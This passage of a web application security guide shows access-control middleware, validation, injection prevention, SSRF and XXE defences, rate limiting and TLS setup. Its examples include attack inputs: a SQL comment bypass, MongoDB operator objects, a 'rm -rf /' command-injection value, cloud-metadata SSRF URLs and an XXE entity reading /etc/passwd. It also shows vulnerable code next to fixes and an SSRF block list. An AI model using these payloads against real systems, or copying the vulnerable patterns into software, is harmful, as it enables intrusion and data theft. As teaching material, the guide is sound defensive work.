PERMISSIONS.POST_UPDATE_ANY,\n    PERMISSIONS.POST_DELETE_ANY\n  ],\n  [ROLES.USER]: [\n    PERMISSIONS.USER_READ,\n    PERMISSIONS.POST_CREATE,\n    PERMISSIONS.POST_UPDATE_OWN\n  ],\n  [ROLES.GUEST]: [\n    PERMISSIONS.USER_READ\n  ]\n};\n\n// Middleware\nfunction requirePermission(permission) {\n  return async (req, res, next) => {\n    const user = req.user;\n\n    if (!user) {\n      return res.status(401).json({ error: 'Unauthorized' });\n    }\n\n    const userPermissions = ROLE_PERMISSIONS[user.role] || [];\n\n    if (!userPermissions.includes(permission)) {\n      return res.status(403).json({ error: 'Forbidden: Insufficient permissions' });\n    }\n\n    next();\n  };\n}\n\nfunction requireRole(...roles) {\n  return (req, res, next) => {\n    if (!req.user || !roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Forbidden: Insufficient role' });\n    }\n    next();\n  };\n}\n\n// Usage\napp.post('/users',\n  authenticateToken,\n  requirePermission(PERMISSIONS.USER_CREATE),\n  createUser\n);\n\napp.delete('/posts/:id',\n  authenticateToken,\n  requirePermission(PERMISSIONS.POST_DELETE_ANY),\n  deletePost\n);\n\napp.put('/posts/:id',\n  authenticateToken,\n  async (req, res, next) => {\n    const post = await getPostById(req.params.id);\n\n    // Check ownership\n    if (post.authorId === req.user.id) {\n      return requirePermission(PERMISSIONS.POST_UPDATE_OWN)(req, res, next);\n    } else {\n      return requirePermission(PERMISSIONS.POST_UPDATE_ANY)(req, res, next);\n    }\n  },\n  updatePost\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attribute-Based Access Control (ABAC):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Policy engine\nclass PolicyEngine {\n  constructor() {\n    this.policies = [];\n  }\n\n  addPolicy(policy) {\n    this.policies.push(policy);\n  }\n\n  evaluate(subject, action, resource, context = {}) {\n    for (const policy of this.policies) {\n      if (policy.matches(subject, action, resource, context)) {\n        return policy.effect === 'allow';\n      }\n    }\n    return false; // Deny by default\n  }\n}\n\n// Example policies\nconst policyEngine = new PolicyEngine();\n\npolicyEngine.addPolicy({\n  effect: 'allow',\n  matches: (subject, action, resource, context) => {\n    return subject.role === 'admin'; // Admins can do anything\n  }\n});\n\npolicyEngine.addPolicy({\n  effect: 'allow',\n  matches: (subject, action, resource, context) => {\n    return action === 'read' && resource.visibility === 'public';\n  }\n});\n\npolicyEngine.addPolicy({\n  effect: 'allow',\n  matches: (subject, action, resource, context) => {\n    return action === 'update' &&\n           resource.authorId === subject.id &&\n           context.withinBusinessHours === true;\n  }\n});\n\n// Middleware\nfunction requireAccess(action, getResource) {\n  return async (req, res, next) => {\n    const subject = req.user;\n    const resource = await getResource(req);\n    const context = {\n      withinBusinessHours: isBusinessHours(),\n      ipAddress: req.ip\n    };\n\n    if (!policyEngine.evaluate(subject, action, resource, context)) {\n      return res.status(403).json({ error: 'Access denied' });\n    }\n\n    next();\n  };\n}\n\n// Usage\napp.put('/documents/:id',\n  authenticateToken,\n  requireAccess('update', async (req) => {\n    return await getDocumentById(req.params.id);\n  }),\n  updateDocument\n);\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"6-backend--api-security",children:"6. Backend & API Security"}),"\n",(0,r.jsx)(n.h3,{id:"input-validation",children:"Input Validation"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Validation Libraries:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Using Zod\nconst { z } = require('zod');\n\nconst userSchema = z.object({\n  email: z.string().email().max(255),\n  password: z.string().min(12).max(128),\n  age: z.number().int().min(13).max(120),\n  username: z.string().regex(/^[a-zA-Z0-9_-]{3,20}$/),\n  website: z.string().url().optional(),\n  bio: z.string().max(500).optional()\n});\n\napp.post('/register', async (req, res) => {\n  try {\n    const validData = userSchema.parse(req.body);\n    // Process valid data\n    await createUser(validData);\n    res.json({ success: true });\n  } catch (err) {\n    if (err instanceof z.ZodError) {\n      return res.status(400).json({\n        error: 'Validation failed',\n        details: err.errors\n      });\n    }\n    throw err;\n  }\n});\n\n// Using Joi\nconst Joi = require('joi');\n\nconst postSchema = Joi.object({\n  title: Joi.string().min(1).max(200).required(),\n  content: Joi.string().min(1).max(50000).required(),\n  tags: Joi.array().items(Joi.string().max(30)).max(10),\n  publishedAt: Joi.date().iso().optional(),\n  metadata: Joi.object().unknown(true).optional()\n});\n\nconst { error, value } = postSchema.validate(req.body, {\n  abortEarly: false,\n  stripUnknown: true\n});\n\nif (error) {\n  return res.status(400).json({\n    error: error.details.map(d => d.message)\n  });\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Sanitization:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const validator = require('validator');\nconst xss = require('xss');\n\nfunction sanitizeInput(input) {\n  // Remove control characters\n  let sanitized = input.replace(/[\\x00-\\x1F\\x7F]/g, '');\n\n  // Escape HTML\n  sanitized = validator.escape(sanitized);\n\n  // Additional XSS protection\n  sanitized = xss(sanitized, {\n    whiteList: {}, // No HTML allowed\n    stripIgnoreTag: true,\n    stripIgnoreTagBody: ['script', 'style']\n  });\n\n  return sanitized.trim();\n}\n\n// File upload validation\nconst multer = require('multer');\nconst path = require('path');\n\nconst fileFilter = (req, file, cb) => {\n  const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];\n  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif'];\n\n  const ext = path.extname(file.originalname).toLowerCase();\n\n  if (!allowedMimes.includes(file.mimetype) || !allowedExts.includes(ext)) {\n    return cb(new Error('Invalid file type'), false);\n  }\n\n  cb(null, true);\n};\n\nconst upload = multer({\n  storage: multer.diskStorage({\n    destination: './uploads/',\n    filename: (req, file, cb) => {\n      // Generate random filename to prevent path traversal\n      const uniqueName = `${Date.now()}-${crypto.randomBytes(8).toString('hex')}${path.extname(file.originalname)}`;\n      cb(null, uniqueName);\n    }\n  }),\n  fileFilter: fileFilter,\n  limits: {\n    fileSize: 5 * 1024 * 1024, // 5MB\n    files: 1\n  }\n});\n\napp.post('/upload', upload.single('image'), (req, res) => {\n  res.json({ filename: req.file.filename });\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"sql-injection",children:"SQL Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"What It Is:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"-- Vulnerable query\nSELECT * FROM users WHERE username = '${username}' AND password = '${password}'\n\n-- Attack input\nusername: admin'--\npassword: anything\n\n-- Resulting query (-- comments out password check)\nSELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Parameterized Queries (Prepared Statements):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\ndb.query(query, (err, results) => {\n  // Dangerous!\n});\n\n// \u2705 SAFE - MySQL with placeholders\nconst query = 'SELECT * FROM users WHERE email = ?';\ndb.query(query, [email], (err, results) => {\n  // Safe!\n});\n\n// \u2705 SAFE - PostgreSQL with named parameters\nconst query = 'SELECT * FROM users WHERE email = $1';\ndb.query(query, [email], (err, results) => {\n  // Safe!\n});\n\n// \u2705 SAFE - Using ORM (Sequelize)\nconst user = await User.findOne({\n  where: {\n    email: email\n  }\n});\n\n// \u2705 SAFE - Using query builder (Knex)\nconst users = await knex('users')\n  .where('email', email)\n  .select('*');\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Input Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const validator = require('validator');\n\nfunction validateEmail(email) {\n  if (!validator.isEmail(email)) {\n    throw new Error('Invalid email format');\n  }\n  if (email.length > 255) {\n    throw new Error('Email too long');\n  }\n  return email;\n}\n\nfunction validateId(id) {\n  const parsed = parseInt(id, 10);\n  if (isNaN(parsed) || parsed < 1) {\n    throw new Error('Invalid ID');\n  }\n  return parsed;\n}\n\napp.get('/users/:id', async (req, res) => {\n  try {\n    const userId = validateId(req.params.id);\n    const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);\n    res.json(user);\n  } catch (err) {\n    res.status(400).json({ error: err.message });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Least Privilege Database Access:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"-- Create restricted user for application\nCREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';\n\n-- Grant only necessary permissions\nGRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';\nGRANT SELECT, INSERT, UPDATE ON myapp.posts TO 'app_user'@'localhost';\n\n-- Don't grant DELETE, DROP, or admin privileges\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Parameterized queries always\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," ORMs with parameter binding\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Input validation and type checking\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Least privilege database accounts\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," String concatenation for queries\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Dynamic SQL with user input\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Displaying database errors to users"]}),"\n",(0,r.jsx)(n.h3,{id:"nosql-injection",children:"NoSQL Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MongoDB Injection Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Attack: username = {\"$gt\": \"\"}, password = {\"$gt\": \"\"}\n  const user = await db.collection('users').findOne({\n    username: username,\n    password: password\n  });\n\n  if (user) {\n    res.json({ success: true });\n  }\n});\n\n// \u2705 SAFE - Validate and sanitize\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Ensure inputs are strings\n  if (typeof username !== 'string' || typeof password !== 'string') {\n    return res.status(400).json({ error: 'Invalid input' });\n  }\n\n  const user = await db.collection('users').findOne({\n    username: username,\n    password: password // Should be hashed!\n  });\n\n  if (user) {\n    res.json({ success: true });\n  }\n});\n\n// \u2705 BETTER - Using Mongoose with schema validation\nconst userSchema = new mongoose.Schema({\n  username: { type: String, required: true },\n  password: { type: String, required: true }\n});\n\nconst User = mongoose.model('User', userSchema);\n\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  const user = await User.findOne({ username, password });\n  // Mongoose automatically sanitizes\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Sanitization Library:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const mongoSanitize = require('express-mongo-sanitize');\n\n// Sanitize all user input\napp.use(mongoSanitize({\n  replaceWith: '_',\n  onSanitize: ({ req, key }) => {\n    console.warn(`Sanitized ${key} in ${req.path}`);\n  }\n}));\n\n// Or manually sanitize\nconst sanitize = require('mongo-sanitize');\n\napp.post('/search', async (req, res) => {\n  const query = sanitize(req.body.query);\n  const results = await db.collection('posts').find({ title: query });\n  res.json(results);\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"command-injection",children:"Command Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"What It Is:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\nconst { exec } = require('child_process');\n\napp.get('/ping', (req, res) => {\n  const host = req.query.host;\n\n  // Attack: host = \"google.com; rm -rf /\"\n  exec(`ping -c 4 ${host}`, (err, stdout) => {\n    res.send(stdout);\n  });\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 SAFE - Use parameterized execution\nconst { execFile } = require('child_process');\n\napp.get('/ping', (req, res) => {\n  const host = req.query.host;\n\n  // Validate hostname\n  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {\n    return res.status(400).json({ error: 'Invalid hostname' });\n  }\n\n  // execFile doesn't invoke shell\n  execFile('ping', ['-c', '4', host], (err, stdout) => {\n    if (err) {\n      return res.status(500).json({ error: 'Ping failed' });\n    }\n    res.send(stdout);\n  });\n});\n\n// \u2705 BETTER - Avoid executing external commands\n// Use native libraries instead\nconst ping = require('ping');\n\napp.get('/ping', async (req, res) => {\n  const host = req.query.host;\n\n  try {\n    const result = await ping.promise.probe(host, {\n      timeout: 10\n    });\n    res.json(result);\n  } catch (err) {\n    res.status(500).json({ error: 'Ping failed' });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"insecure-direct-object-references-idor",children:"Insecure Direct Object References (IDOR)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE - No authorization check\napp.get('/api/orders/:id', authenticateToken, async (req, res) => {\n  const order = await db.query('SELECT * FROM orders WHERE id = ?', [req.params.id]);\n\n  // Anyone authenticated can view any order!\n  res.json(order);\n});\n\n// Attack: User changes URL from /api/orders/123 to /api/orders/124\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 SAFE - Verify ownership\napp.get('/api/orders/:id', authenticateToken, async (req, res) => {\n  const order = await db.query(\n    'SELECT * FROM orders WHERE id = ? AND user_id = ?',\n    [req.params.id, req.user.id]\n  );\n\n  if (!order) {\n    return res.status(404).json({ error: 'Order not found' });\n  }\n\n  res.json(order);\n});\n\n// \u2705 SAFE - Reusable authorization middleware\nasync function authorizeResource(resourceType) {\n  return async (req, res, next) => {\n    const resourceId = req.params.id;\n    const userId = req.user.id;\n\n    const resource = await getResource(resourceType, resourceId);\n\n    if (!resource) {\n      return res.status(404).json({ error: 'Resource not found' });\n    }\n\n    // Check ownership\n    if (resource.userId !== userId && req.user.role !== 'admin') {\n      return res.status(403).json({ error: 'Forbidden' });\n    }\n\n    req.resource = resource;\n    next();\n  };\n}\n\napp.get('/api/orders/:id',\n  authenticateToken,\n  authorizeResource('order'),\n  (req, res) => {\n    res.json(req.resource);\n  }\n);\n\napp.delete('/api/documents/:id',\n  authenticateToken,\n  authorizeResource('document'),\n  async (req, res) => {\n    await deleteDocument(req.params.id);\n    res.json({ success: true });\n  }\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Use UUIDs Instead of Sequential IDs:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c Predictable IDs\n// Orders: 1, 2, 3, 4, 5... (easy to enumerate)\n\n// \u2705 UUIDs\nconst { v4: uuidv4 } = require('uuid');\n\nconst orderId = uuidv4(); // e.g., \"550e8400-e29b-41d4-a716-446655440000\"\n\n// Still need authorization checks, but harder to enumerate\n"})}),"\n",(0,r.jsx)(n.h3,{id:"server-side-request-forgery-ssrf",children:"Server-Side Request Forgery (SSRF)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// \u274c VULNERABLE\napp.get(\'/fetch-url\', async (req, res) => {\n  const url = req.query.url;\n\n  // Attack: url = "http://169.254.169.254/latest/meta-data/" (AWS metadata)\n  // Attack: url = "http://localhost:6379/" (Redis)\n  const response = await axios.get(url);\n  res.send(response.data);\n});\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const axios = require('axios');\nconst { URL } = require('url');\n\n// Whitelist of allowed domains\nconst ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];\n\n// Blacklist of dangerous hosts/IPs\nconst BLOCKED_HOSTS = [\n  'localhost',\n  '127.0.0.1',\n  '0.0.0.0',\n  '169.254.169.254', // AWS metadata\n  '169.254.169.253',\n  '[::1]', // IPv6 localhost\n  '[0:0:0:0:0:0:0:1]'\n];\n\nconst BLOCKED_IP_RANGES = [\n  /^10\\./, // Private network\n  /^172\\.(1[6-9]|2[0-9]|3[0-1])\\./, // Private network\n  /^192\\.168\\./, // Private network\n  /^127\\./, // Loopback\n  /^169\\.254\\./ // Link-local\n];\n\nfunction isUrlSafe(urlString) {\n  try {\n    const url = new URL(urlString);\n\n    // Only allow HTTP/HTTPS\n    if (!['http:', 'https:'].includes(url.protocol)) {\n      return false;\n    }\n\n    // Check whitelist\n    if (!ALLOWED_DOMAINS.some(domain => url.hostname.endsWith(domain))) {\n      return false;\n    }\n\n    // Check blacklist\n    if (BLOCKED_HOSTS.includes(url.hostname.toLowerCase())) {\n      return false;\n    }\n\n    // Check IP ranges\n    if (BLOCKED_IP_RANGES.some(pattern => pattern.test(url.hostname))) {\n      return false;\n    }\n\n    return true;\n  } catch (err) {\n    return false;\n  }\n}\n\n// \u2705 SAFE\napp.get('/fetch-url', async (req, res) => {\n  const url = req.query.url;\n\n  if (!isUrlSafe(url)) {\n    return res.status(400).json({ error: 'Invalid or forbidden URL' });\n  }\n\n  try {\n    const response = await axios.get(url, {\n      timeout: 5000,\n      maxRedirects: 0, // Disable redirects\n      validateStatus: status => status === 200\n    });\n\n    res.send(response.data);\n  } catch (err) {\n    res.status(500).json({ error: 'Failed to fetch URL' });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"xml-external-entity-xxe",children:"XML External Entity (XXE)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\nconst libxmljs = require('libxmljs');\n\napp.post('/parse-xml', (req, res) => {\n  const xml = req.body.xml;\n\n  // Attack XML:\n  // <?xml version=\"1.0\"?>\n  // <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n  // <data>&xxe;</data>\n\n  const doc = libxmljs.parseXml(xml);\n  res.send(doc.toString());\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 SAFE - Disable external entities\nconst libxmljs = require('libxmljs');\n\napp.post('/parse-xml', (req, res) => {\n  const xml = req.body.xml;\n\n  try {\n    const doc = libxmljs.parseXml(xml, {\n      noent: false,        // Don't substitute entities\n      nonet: true,         // Don't fetch external resources\n      dtdload: false,      // Don't load external DTD\n      dtdvalid: false      // Don't validate against DTD\n    });\n\n    res.send(doc.toString());\n  } catch (err) {\n    res.status(400).json({ error: 'Invalid XML' });\n  }\n});\n\n// \u2705 BETTER - Use JSON instead of XML when possible\napp.post('/parse-data', express.json(), (req, res) => {\n  // JSON doesn't have XXE vulnerabilities\n  const data = req.body;\n  res.json(data);\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"api-security-best-practices",children:"API Security Best Practices"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Rate Limiting:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const rateLimit = require('express-rate-limit');\nconst RedisStore = require('rate-limit-redis');\n\n// General API rate limit\nconst apiLimiter = rateLimit({\n  store: new RedisStore({\n    client: redisClient,\n    prefix: 'rl:api:'\n  }),\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // 100 requests per window\n  standardHeaders: true,\n  legacyHeaders: false,\n  message: { error: 'Too many requests, please try again later' }\n});\n\napp.use('/api/', apiLimiter);\n\n// Stricter limit for authentication endpoints\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  skipSuccessfulRequests: true\n});\n\napp.post('/api/login', authLimiter, loginHandler);\n\n// Per-user rate limiting\nconst createUserLimiter = () => rateLimit({\n  windowMs: 60 * 1000, // 1 minute\n  max: 10,\n  keyGenerator: (req) => req.user?.id || req.ip,\n  skip: (req) => req.user?.role === 'admin'\n});\n\napp.post('/api/posts', authenticateToken, createUserLimiter(), createPost);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"API Versioning:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// URL versioning\napp.use('/api/v1', v1Router);\napp.use('/api/v2', v2Router);\n\n// Header versioning\napp.use((req, res, next) => {\n  const version = req.headers['api-version'] || '1';\n  req.apiVersion = version;\n  next();\n});\n\n// Deprecation warnings\napp.use('/api/v1', (req, res, next) => {\n  res.set('Warning', '299 - \"API v1 is deprecated, please use v2\"');\n  res.set('Sunset', 'Sat, 31 Dec 2025 23:59:59 GMT');\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Request Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const { body, param, query, validationResult } = require('express-validator');\n\nconst validateRequest = (req, res, next) => {\n  const errors = validationResult(req);\n  if (!errors.isEmpty()) {\n    return res.status(400).json({ errors: errors.array() });\n  }\n  next();\n};\n\napp.post('/api/users',\n  [\n    body('email').isEmail().normalizeEmail(),\n    body('password').isLength({ min: 12 }),\n    body('age').optional().isInt({ min: 13, max: 120 }),\n    validateRequest\n  ],\n  createUser\n);\n\napp.get('/api/users/:id',\n  [\n    param('id').isUUID(),\n    validateRequest\n  ],\n  getUser\n);\n\napp.get('/api/posts',\n  [\n    query('page').optional().isInt({ min: 1 }),\n    query('limit').optional().isInt({ min: 1, max: 100 }),\n    query('sort').optional().isIn(['asc', 'desc']),\n    validateRequest\n  ],\n  getPosts\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"API Authentication:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// API Key authentication\nconst API_KEYS = new Map(); // In production, use database\n\nfunction authenticateAPIKey(req, res, next) {\n  const apiKey = req.headers['x-api-key'];\n\n  if (!apiKey) {\n    return res.status(401).json({ error: 'API key required' });\n  }\n\n  const keyData = API_KEYS.get(apiKey);\n\n  if (!keyData || keyData.expiresAt < Date.now()) {\n    return res.status(401).json({ error: 'Invalid or expired API key' });\n  }\n\n  req.apiKeyData = keyData;\n  next();\n}\n\n// Generate API keys\nfunction generateAPIKey() {\n  return crypto.randomBytes(32).toString('base64url');\n}\n\napp.post('/api/keys/generate', authenticateToken, async (req, res) => {\n  const apiKey = generateAPIKey();\n  const expiresAt = Date.now() + (365 * 24 * 60 * 60 * 1000); // 1 year\n\n  await db.query(\n    'INSERT INTO api_keys (key_hash, user_id, expires_at) VALUES (?, ?, ?)',\n    [hashAPIKey(apiKey), req.user.id, expiresAt]\n  );\n\n  // Return key only once\n  res.json({\n    apiKey: apiKey,\n    expiresAt: expiresAt,\n    warning: 'Store this key securely. It will not be shown again.'\n  });\n});\n\nfunction hashAPIKey(key) {\n  return crypto.createHash('sha256').update(key).digest('hex');\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Response Security:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Don't leak sensitive info in responses\napp.use((err, req, res, next) => {\n  console.error(err); // Log full error server-side\n\n  // Send generic error to client\n  res.status(err.status || 500).json({\n    error: process.env.NODE_ENV === 'production'\n      ? 'An error occurred'\n      : err.message\n  });\n});\n\n// Remove sensitive fields\nfunction sanitizeUser(user) {\n  const { password, passwordResetToken, mfaSecret, ...safe } = user;\n  return safe;\n}\n\napp.get('/api/users/:id', async (req, res) => {\n  const user = await getUserById(req.params.id);\n  res.json(sanitizeUser(user));\n});\n\n// Set proper content type\napp.use((req, res, next) => {\n  res.type('application/json');\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"7-transport--network-security",children:"7. Transport & Network Security"}),"\n",(0,r.jsx)(n.h3,{id:"https--tls",children:"HTTPS & TLS"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Why HTTPS:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Encryption"}),": Protects data in transit"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Authentication"}),": Verifies server identity"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Integrity"}),": Prevents tampering"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"TLS Configuration (Node.js):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const https = require('https');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('/path/to/private-key.pem'),\n  cert: fs.readFileSync('/path/to/certificate.pem'),\n  ca: fs.readFileSync('/path/to/ca-certificate.pem'),\n\n  // Security settings\n  minVersion: 'TLSv1.2',\n  maxVersion: 'TLSv1.3',\n  ciphers: [\n    'ECDHE-ECDSA-AES128-GCM-SHA256',\n    'ECDHE-RSA-AES128-GCM-SHA256',\n    'ECDHE-ECDSA-AES256-GCM-SHA384',\n    'ECDHE-RSA-AES256-GCM-SHA384',\n    'ECDHE-ECDSA-CHACHA20-POLY1305',\n    'ECDHE-RSA-CHACHA20-POLY1305'\n  ].join(':'),\n  honorCipherOrder: true,\n\n  // Disable insecure renegotiation\n  secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION\n};\n\nhttps.createServer(options, app).listen(443);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Nginx TLS Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-nginx",children:"server {\n    listen 443 ssl http2;\n    server_name example.com;\n\n    # Certificates\n    ssl_certificate /path/to/fullchain.pem;\n    ssl_certificate_key /path/to/privkey.pem;\n\n    # TLS versions\n    ssl_protocols TLSv1.2 TLSv1.3;\n\n    # Ciphers\n    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';\n    ssl_prefer_server_ciphers off;\n\n    # Performance\n    ssl_session_cache shared:SSL:10m;\n    ssl_session_timeout 10m;\n    ssl_session_tickets off;\n\n    # OCSP Stapling\n    ssl_stapling on;\n    ssl_stapling_verify on;\n    ssl_trusted_certificate /path/to/chain.pem;\n\n    # Security headers\n    add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;\n\n    location / {\n        proxy_pass http://localhost:3000;\n    }\n}\n\n# Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    server_name example.com;\n    return 301 https://$server_name$request_uri;\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"certificate-management",children:"Certificate Management"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Let's Encrypt with Certbot:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install certbot\nsudo apt-get install certbot python3-certbot-nginx\n\n# Obtain certificate\nsudo certbot --nginx -d example.com -d www.example.com\n\n# Auto-renewal (runs twice daily)\nsudo certbot renew --dry-run\n\n# Renewal hook\nsudo certbot renew --deploy-hook "systemctl reload nginx"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Automated Renewal (Cron):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# /etc/cron.d/certbot\n0 */12 * * * root certbot renew --quiet --deploy-hook "systemctl reload nginx"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Certificate Monitoring:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const https = require('https');\nconst tls = require('tls');\n\nasync function checkCertificateExpiry(hostname) {\n  return new Promise((resolve, reject) => {\n    const socket = tls.connect(443, hostname, () => {\n      const cert = 